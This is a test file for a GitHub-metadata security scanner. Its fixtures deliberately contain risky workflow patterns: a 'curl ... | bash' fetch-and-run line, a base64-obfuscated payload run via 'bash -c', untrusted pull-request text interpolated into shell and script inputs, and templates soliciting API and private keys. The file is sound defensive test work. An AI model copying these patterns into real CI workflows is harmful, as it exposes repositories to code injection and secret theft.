import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { tmpdir } from "node:os";
import { afterEach, describe, expect, it } from "vitest";

import {
  formatGithubMetadataScanResult,
  scanGithubMetadata
} from "../src";

const tempDirs: string[] = [];

async function writeRepoFile(rootPath: string, relativePath: string, content: string): Promise<void> {
  const targetPath = path.join(rootPath, relativePath);
  await mkdir(path.dirname(targetPath), { recursive: true });
  await writeFile(targetPath, content, "utf8");
}

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map(async (dirPath) => {
    await rm(dirPath, { recursive: true, force: true });
  }));
});

describe("scanGithubMetadata", () => {
  it("detects high-risk workflow patterns", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/release.yml", `name: release
on:
  pull_request_target:
jobs:
  ship:
    runs-on: [self-hosted, linux]
    permissions:
      contents: write
      id-token: write
    steps:
      - uses: actions/checkout@v4
      - run: curl https://example.invalid/install.sh | bash
      - uses: vendor/security-action@main
      - name: Checkout PR head
        with:
          ref: \${{ github.event.pull_request.head.sha }}
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(result.scannedFiles).toEqual([".github/workflows/release.yml"]);
    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHWF-003",
      "WG-GHWF-002",
      "WG-GHWF-004",
      "WG-GHWF-005",
      "WG-GHWF-006",
      "WG-GHWF-008",
      "WG-GHWF-009"
    ]));
  });

  it("detects dangerous dependabot and template settings", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/dependabot.yml", `version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    insecure-external-code-execution: allow
`);
    await writeRepoFile(rootPath, ".github/ISSUE_TEMPLATE/bug.md", `Please provide your API key so we can reproduce the issue.
If that fails, run: curl https://example.invalid/install.sh | bash
`);
    await writeRepoFile(rootPath, ".github/PULL_REQUEST_TEMPLATE.md", `Please attach the private key used in CI if the build failed.
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHDB-001",
      "WG-GHTM-001",
      "WG-GHTM-002"
    ]));
  });

  it("flags repository-wide CODEOWNERS entries for manual review", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/CODEOWNERS", `* @security-team
docs/** @docs-team
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHCO-001",
        severity: "info",
        file: ".github/CODEOWNERS",
        line: 1
      })
    ]));
  });

  it("returns no findings for minimally privileged workflows", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/ci.yml", `name: ci
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
      - run: npm test
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual([]);
    expect(formatGithubMetadataScanResult(result)).toContain("No .github findings");
  });

  it("flags workflows without explicit permissions", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/unpinned-perms.yml", `name: unpinned permissions
on:
  push:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
      - run: npm test
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-010",
        severity: "info"
      })
    ]));
  });

  it("flags reusable workflow secret inheritance and untrusted interpolation", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/reusable-risk.yml", `name: reusable risk
on:
  workflow_dispatch:
jobs:
  call-other:
    uses: vendor/reusable/.github/workflows/deploy.yml@main
    secrets: inherit
  shell-risk:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - run: echo "\${{ github.event.pull_request.title }}"
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHWF-004",
      "WG-GHWF-017",
      "WG-GHWF-011",
      "WG-GHWF-012",
      "WG-GHWF-015"
    ]));
  });

  it("detects obfuscated shell execution and mutable docker action references", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/obfuscated.yml", `name: obfuscated
on:
  pull_request:
permissions:
  contents: read
jobs:
  suspicious:
    runs-on: ubuntu-latest
    steps:
      - uses: docker://alpine:3.20
      - run: |
          PAYLOAD=$(echo ZWNobyBoaQ== | base64 -d)
          bash -c "$PAYLOAD"
`);

    const result = await scanGithubMetadata(rootPath);
    const findingIds = result.findings.map((finding) => finding.id);

    expect(findingIds).toEqual(expect.arrayContaining([
      "WG-GHWF-006",
      "WG-GHWF-016"
    ]));
  });

  it("tracks tainted env values into shell execution", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/tainted-env.yml", `name: tainted env
on:
  pull_request:
permissions:
  contents: read
env:
  PR_TITLE: \${{ github.event.pull_request.title }}
jobs:
  suspicious:
    runs-on: ubuntu-latest
    steps:
      - run: |
          printf '%s\\n' "$PR_TITLE"
          bash -c "$PR_TITLE"
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-018",
        file: ".github/workflows/tainted-env.yml"
      })
    ]));
  });

  it("flags user-controlled expressions passed into action inputs", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/tainted-with.yml", `name: tainted with
on:
  pull_request:
permissions:
  contents: read
jobs:
  suspicious:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
        with:
          script: \${{ github.event.pull_request.body }}
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
        with:
          ref: \${{ github.event.pull_request.head.ref }}
`);

    const result = await scanGithubMetadata(rootPath);
    const findings = result.findings.filter((finding) => finding.id === "WG-GHWF-019");

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        file: ".github/workflows/tainted-with.yml",
        severity: "high"
      }),
      expect.objectContaining({
        file: ".github/workflows/tainted-with.yml",
        severity: "medium"
      })
    ]));
  });

  it("scans local reusable workflow files that are invoked by caller workflows", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-gh-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/caller.yml", `name: caller
on:
  pull_request:
permissions:
  contents: read
jobs:
  delegate:
    uses: ./.github/workflows/reusable.yml
`);
    await writeRepoFile(rootPath, ".github/workflows/reusable.yml", `name: reusable
on:
  workflow_call:
jobs:
  dangerous:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - run: echo \${{ github.event.pull_request.title }}
`);

    const result = await scanGithubMetadata(rootPath);

    expect(result.findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        id: "WG-GHWF-003",
        file: ".github/workflows/reusable.yml"
      }),
      expect.objectContaining({
        id: "WG-GHWF-011",
        file: ".github/workflows/reusable.yml"
      })
    ]));
  });
});
